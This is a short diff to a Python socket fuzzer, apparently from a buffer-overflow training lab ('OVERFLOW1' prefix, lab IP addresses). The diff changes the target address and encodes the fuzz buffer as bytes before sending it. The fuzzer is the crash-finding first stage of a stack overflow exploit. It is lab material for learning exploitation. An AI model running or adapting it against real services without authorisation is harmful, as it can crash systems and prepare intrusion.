@@ -3,7 +3,7 @@
 import socket
 import time
 
-IP = "10.10.195.12" # change me
+IP = "10.10.228.45" # change me
 PORT = 1337 # change me
 PREFIX = "OVERFLOW1 " # change me
 OFFSET = 100
@@ -16,7 +16,7 @@ while True:
         CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         CLIENT.settimeout(3)
         CLIENT.connect(TARGET)
-        CLIENT.send(FUZZ)
+        CLIENT.send(bytes(FUZZ, "latin-1"))
         CLIENT.recv(1024)
         CLIENT.close()
         FUZZ_LENGTH = len(FUZZ) - len(PREFIX)
